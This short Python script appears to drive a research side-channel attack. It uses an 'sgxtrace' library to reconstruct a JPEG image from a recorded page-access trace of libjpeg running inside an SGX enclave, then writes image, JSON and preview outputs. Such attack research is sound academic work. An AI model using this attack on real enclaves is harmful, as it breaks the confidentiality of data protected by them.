from __future__ import annotations

from sgxtrace import attack_jpeg_vcd, save_attack_outputs
from sgxtrace.jpeg import JpegAttackConfig

TRACE = "traces/trace_libjpeg.vcd"
OUTPUT_IMAGE = "jpeg_reconstruction.pgm"
RAW_JSON = "jpeg_reconstruction.json"
PREVIEW_PNG = "jpeg_reconstruction_preview.png"
COLOR_MODE = False   # True voor RGB, False voor grayscale


def run_jpeg_attack():
    print("--- JPEG RECONSTRUCTION ATTACK (Clean Version) ---")

    config = JpegAttackConfig(
        start_range=range(54, 55),
        next_row_range=range(44, 45),
        start_row_range=range(58, 59),
        pre_idct_slow_range=range(56, 57),
        idct_slow_range=range(62, 64),
        data_count_range_no_aexnotify=range(154, 157),
        data_count_range_aexnotify=range(154, 157),
        data_count_pages=frozenset({154, 155, 156}),
        num_colors=3 if COLOR_MODE else 1,
        aexnotify=False,
    )

    print(f"Loading trace: {TRACE}")
    result = attack_jpeg_vcd(TRACE, config)

    save_attack_outputs(
        result,
        image_path=OUTPUT_IMAGE,
        raw_json_path=RAW_JSON,
        preview_path=PREVIEW_PNG,
        preview_scale=16,
    )

    width, height = result.reconstruction.reconstructed_size()
    print(f"Processed pages: {result.processed_pages}")
    print(f"Final state:     {result.final_state.value}")
    print(f"Image size:      {width} x {height} blocks")
    print(f"Channels:        {config.num_colors}")
    print(f"Image written:   {OUTPUT_IMAGE}")
    print(f"Preview written: {PREVIEW_PNG}")
    print(f"Raw JSON:        {RAW_JSON}")
    print(f"Min data count:  {result.reconstruction.min_data}")
    print(f"Max data count:  {result.reconstruction.max_data}")


if __name__ == "__main__":
    run_jpeg_attack()
